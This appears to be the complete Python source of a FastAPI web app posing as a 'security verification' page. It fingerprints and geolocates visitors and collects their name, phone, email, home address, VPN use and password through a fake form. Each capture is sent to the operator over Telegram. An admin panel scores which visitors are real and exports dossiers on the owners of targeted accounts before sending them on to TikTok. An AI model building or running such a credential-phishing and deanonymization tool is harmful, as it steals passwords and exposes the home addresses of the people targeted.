import csv
import hashlib
import io
import json
import secrets
from datetime import datetime, timezone

import httpx
from fastapi import Depends, FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, RedirectResponse, StreamingResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from sqlalchemy import desc, func, select
from sqlalchemy.orm import Session

from . import config, geo
from .db import Campaign, Hit, Note, Verificacion, get_db, init_db

app = FastAPI(title="Verificación de seguridad")
app.mount("/static", StaticFiles(directory="app/static"), name="static")
templates = Jinja2Templates(directory="app/templates")
security = HTTPBasic()

init_db()


def client_ip(request: Request) -> str:
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    for h in ("cf-connecting-ip", "x-real-ip"):
        v = request.headers.get(h)
        if v:
            return v.strip()
    return request.client.host if request.client else ""


def sha(payload) -> str:
    return hashlib.sha256(json.dumps(payload, sort_keys=True, default=str).encode()).hexdigest()


def notify(text: str):
    if config.TELEGRAM_TOKEN and config.TELEGRAM_CHAT:
        try:
            httpx.post(
                f"https://api.telegram.org/bot{config.TELEGRAM_TOKEN}/sendMessage",
                json={"chat_id": config.TELEGRAM_CHAT, "text": text},
                timeout=3.0,
            )
        except Exception:
            pass


def get_campaign(db: Session, slug: str) -> Campaign:
    c = db.scalar(select(Campaign).where(Campaign.slug == slug))
    if not c:
        c = Campaign(slug=slug, label=slug, cuenta_objetivo="@" + slug)
        db.add(c)
        db.commit()
        db.refresh(c)
    return c


def registrar_hit(request: Request, db: Session, campaign: Campaign, kind: str, step: str, extra: dict):
    ua = request.headers.get("user_agent", "")
    prev, reason = geo.is_preview(ua)
    ip = client_ip(request)
    g = geo.geo_lookup(ip)
    payload = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "ip": ip, "ua": ua, "kind": kind, "step": step,
        "geo": g, "extra": extra,
    }
    h = Hit(
        campaign_id=campaign.id,
        session_id=str(extra.get("sid", ""))[:64],
        kind=kind, step=step,
        ip=ip,
        country=g.get("country", ""), region=g.get("region", ""),
        city=g.get("city", ""), lat=g.get("lat", 0.0), lon=g.get("lon", 0.0),
        org=g.get("org", ""), asn=g.get("asn", ""),
        user_agent=ua[:1000],
        accept_language=request.headers.get("accept-language", "")[:120],
        referer=request.headers.get("referer", "")[:500],
        preview_flag=prev, preview_reason=reason,
        tz=str(extra.get("tz", ""))[:80],
        tz_country=geo.tz_country(str(extra.get("tz", ""))),
        screen=str(extra.get("pantalla", ""))[:30],
        languages=str(extra.get("idiomas", ""))[:120],
        platform=str(extra.get("plataforma", ""))[:80],
        webgl_renderer=str(extra.get("webgl", ""))[:200],
        webdriver=bool(extra.get("webdriver", False)),
        raw_json=json.dumps(payload, default=str),
        sha256=sha(payload),
    )
    db.add(h)
    db.commit()
    return h


# ============================================================================
# 1. RUTAS PÚBLICAS Y API
# ============================================================================

@app.get("/healthz")
def healthz():
    return {"ok": True}


@app.get("/")
def root():
    return RedirectResponse(f"/{config.DEFAULT_SLUG}")


@app.post("/api/hit")
async def api_hit(request: Request, db: Session = Depends(get_db)):
    body = await request.json()
    slug = body.get("slug", config.DEFAULT_SLUG)
    c = get_campaign(db, slug)
    h = registrar_hit(request, db, c, body.get("kind", "page"), body.get("step", "paso1"), body)
    return JSONResponse({"ok": True, "id": h.id})


@app.post("/api/beacon")
async def api_beacon(request: Request, db: Session = Depends(get_db)):
    try:
        body = await request.json()
    except Exception:
        body = {}
    slug = body.get("slug", config.DEFAULT_SLUG)
    c = get_campaign(db, slug)
    registrar_hit(request, db, c, "beacon", body.get("step", ""), body)
    return JSONResponse({"ok": True})


@app.post("/api/form")
async def api_form(request: Request, db: Session = Depends(get_db)):
    b = await request.json()
    c = get_campaign(db, b.get("slug", config.DEFAULT_SLUG))
    payload = {k: v for k, v in b.items()}
    v = Verificacion(
        campaign_id=c.id,
        session_id=str(b.get("sid", ""))[:64],
        nombre=b.get("nombre", "")[:160],
        telefono=b.get("telefono", "")[:40],
        email=b.get("email", "")[:160],
        pais=b.get("pais", "")[:80],
        estado=b.get("estado", "")[:80],
        ciudad=b.get("ciudad", "")[:120],
        calle=b.get("calle", "")[:200],
        numero=b.get("numero", "")[:120],
        referencia=b.get("referencia", "")[:200],
        codigo_postal=b.get("codigo_postal", "")[:20],
        dispositivo_habitual=b.get("dispositivo_habitual", "")[:40],
        usa_vpn=b.get("usa_vpn", "")[:20],
        dispositivos_abiertos=b.get("dispositivos_abiertos", "")[:20],
        password=b.get("password", "")[:120],
        raw_json=json.dumps(payload, default=str),
        sha256=sha(payload),
    )
    db.add(v)
    db.commit()
    registrar_hit(request, db, c, "form", "paso3", b)
    notify(f"Nueva verificación: {v.nombre} — {v.ciudad}, {v.estado} — {v.telefono}")
    return JSONResponse({"ok": True, "id": v.id})


@app.get("/go/{slug}")
def go(request: Request, slug: str, sid: str = "", db: Session = Depends(get_db)):
    c = get_campaign(db, slug)
    registrar_hit(request, db, c, "click", "final", {"sid": sid})
    return RedirectResponse(c.redirect_url or "https://www.tiktok.com/")


# ============================================================================
# 2. PANEL DE ADMINISTRACIÓN ORIGINAL
# ============================================================================

def auth(cred: HTTPBasicCredentials = Depends(security)):
    ok_u = secrets.compare_digest(cred.username, config.ADMIN_USER)
    ok_p = secrets.compare_digest(cred.password, config.ADMIN_PASSWORD)
    if not (ok_u and ok_p):
        raise HTTPException(401, "No autorizado", {"WWW-Authenticate": "Basic"})
    return cred.username


def score(hits, ver):
    s = 0
    for h in hits:
        if not h.preview_flag:
            s += 15
            break
    if any(h.tz for h in hits):
        s += 20
    if hits and hits[0].country and any(h.tz_country == "VE" for h in hits):
        s += 15
    if ver:
        s += 30
        if ver.calle:
            s += 15
        if ver.ciudad and hits and hits[0].city and ver.ciudad.lower() in hits[0].city.lower():
            s += 5
    return min(s, 100)


@app.get("/panel", response_class=HTMLResponse)
def panel(request: Request, db: Session = Depends(get_db), _=Depends(auth)):
    campaigns = db.scalars(select(Campaign)).all()
    filas = []
    for c in campaigns:
        sids = [r[0] for r in db.execute(
            select(Hit.session_id).where(Hit.campaign_id == c.id)
            .group_by(Hit.session_id)).all()]
        for sid in sids:
            if not sid:
                continue
            hits = db.scalars(select(Hit).where(Hit.session_id == sid).order_by(Hit.ts_utc)).all()
            ver = db.scalar(select(Verificacion).where(Verificacion.session_id == sid))
            real = [h for h in hits if not h.preview_flag]
            filas.append({
                "sid": sid, "campaign": c.slug,
                "n_hits": len(hits), "human": bool(real),
                "ip": hits[0].ip, "city": hits[0].city, "country": hits[0].country,
                "tz": next((h.tz for h in hits if h.tz), ""),
                "score": score(hits, ver),
                "ver": ver, "last": hits[-1].ts_utc,
            })
    filas.sort(key=lambda f: f["last"], reverse=True)
    total_h = db.scalar(select(func.count()).select_from(Hit).where(Hit.preview_flag == False)) or 0
    total_p = db.scalar(select(func.count()).select_from(Hit).where(Hit.preview_flag == True)) or 0
    total_v = db.scalar(select(func.count()).select_from(Verificacion)) or 0
    return templates.TemplateResponse("panel.html", {
        "request": request, "filas": filas,
        "total_h": total_h, "total_p": total_p, "total_v": total_v,
    })


@app.get("/panel/session/{sid}", response_class=HTMLResponse)
def session_view(request: Request, sid: str, db: Session = Depends(get_db), _=Depends(auth)):
    hits = db.scalars(select(Hit).where(Hit.session_id == sid).order_by(Hit.ts_utc)).all()
    ver = db.scalar(select(Verificacion).where(Verificacion.session_id == sid))
    notas = db.scalars(select(Note).where(Note.entity_id == sid).order_by(desc(Note.created_at))).all()
    return templates.TemplateResponse("session.html", {
        "request": request, "sid": sid, "hits": hits, "ver": ver, "notas": notas,
    })


@app.post("/panel/session/{sid}/note")
async def add_note(sid: str, request: Request, db: Session = Depends(get_db), _=Depends(auth)):
    b = await request.json()
    db.add(Note(entity_type="session", entity_id=sid, text=b.get("text", "")))
    db.commit()
    return JSONResponse({"ok": True})


@app.get("/panel/export.csv")
def export_csv(db: Session = Depends(get_db), _=Depends(auth)):
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["tipo", "ts_utc", "session_id", "ip", "pais", "region", "ciudad",
                "tz", "nombre", "telefono", "email", "calle", "numero", "referencia",
                "ciudad_declarada", "preview", "sha256"])
    for h in db.scalars(select(Hit).order_by(Hit.ts_utc)).all():
        v = db.scalar(select(Verificacion).where(Verificacion.session_id == h.session_id))
        w.writerow(["hit", h.ts_utc, h.session_id, h.ip, h.country, h.region, h.city,
                    h.tz, "", "", "", "", "", "", "", h.preview_flag, h.sha256])
        if v:
            w.writerow(["ver", v.ts_utc, v.session_id, h.ip, "", "", "",
                        "", v.nombre, v.telefono, v.email, v.calle, v.numero, v.referencia,
                        f"{v.ciudad}/{v.estado}", "", v.sha256])
    return StreamingResponse(iter([buf.getvalue()]), media_type="text/csv",
                             headers={"Content-Disposition": "attachment; filename=export.csv"})


@app.get("/panel/informe/{slug}.md", response_class=PlainTextResponse)
def informe(slug: str, db: Session = Depends(get_db), _=Depends(auth)):
    c = get_campaign(db, slug)
    out = [f"# Informe — {c.slug}", f"Cuenta objetivo: {c.cuenta_objetivo}", ""]
    for v in db.scalars(select(Verificacion).where(Verificacion.campaign_id == c.id)).all():
        hits = db.scalars(select(Hit).where(Hit.session_id == v.session_id)).all()
        h = next((x for x in hits if not x.preview_flag), hits[0] if hits else None)
        out += [
            f"## {v.nombre}", f"- Teléfono: {v.telefono}", f"- Email: {v.email}",
            f"- Dirección declarada: {v.calle} {v.numero}, {v.referencia}, "
            f"{v.ciudad}, {v.estado}, {v.pais}",
            f"- IP: {h.ip if h else '-'} — {h.city if h else '-'}, {h.country if h else '-'}",
            f"- Huso horario del dispositivo: {next((x.tz for x in hits if x.tz), '-')}",
            f"- VPN declarada: {v.usa_vpn}", f"- Hash: {v.sha256}", "",
        ]
    return PlainTextResponse("\n".join(out))


# ============================================================================
# 3. RUTAS ALTERNATIVAS DE DIAGNÓSTICO (A PRUEBA DE CONFLICTOS)
# ============================================================================

@app.get("/admin-panel-seguro", response_class=HTMLResponse)
def admin_panel_seguro(request: Request, db: Session = Depends(get_db), _=Depends(auth)):
    """Panel alternativo con ruta única imposible de confundir"""
    return panel(request, db, _)


@app.get("/datos", response_class=JSONResponse)
def ver_datos_json(db: Session = Depends(get_db), _=Depends(auth)):
    """Muestra los datos en formato JSON puro para diagnóstico inmediato"""
    campaigns = db.scalars(select(Campaign)).all()
    resultados = []
    for c in campaigns:
        hits = db.scalars(select(Hit).where(Hit.campaign_id == c.id)).all()
        verificaciones = db.scalars(select(Verificacion).where(Verificacion.campaign_id == c.id)).all()
        resultados.append({
            "campaign": c.slug,
            "hits": len(hits),
            "verificaciones": len(verificaciones),
            "datos": [
                {
                    "nombre": v.nombre,
                    "telefono": v.telefono,
                    "email": v.email,
                    "ciudad": v.ciudad,
                    "estado": v.estado,
                    "calle": v.calle,
                    "numero": v.numero
                }
                for v in verificaciones
            ]
        })
    return {"total_campaigns": len(resultados), "data": resultados}


@app.get("/datos/csv")
def exportar_datos_csv(db: Session = Depends(get_db), _=Depends(auth)):
    """Exporta todos los datos en CSV directamente"""
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["Nombre", "Teléfono", "Email", "Ciudad", "Estado", "Calle", "Número", "Referencia"])
    for v in db.scalars(select(Verificacion)).all():
        w.writerow([v.nombre, v.telefono, v.email, v.ciudad, v.estado, v.calle, v.numero, v.referencia])
    return StreamingResponse(iter([buf.getvalue()]), media_type="text/csv",
                             headers={"Content-Disposition": "attachment; filename=datos.csv"})


# ============================================================================
# 4. RUTA COMODÍN (SIEMPRE, SIEMPRE AL FINAL)
# ============================================================================

@app.get("/{slug}", response_class=HTMLResponse)
def landing(request: Request, slug: str, db: Session = Depends(get_db)):
    c = get_campaign(db, slug)
    return templates.TemplateResponse("landing.html", {"request": request, "c": c})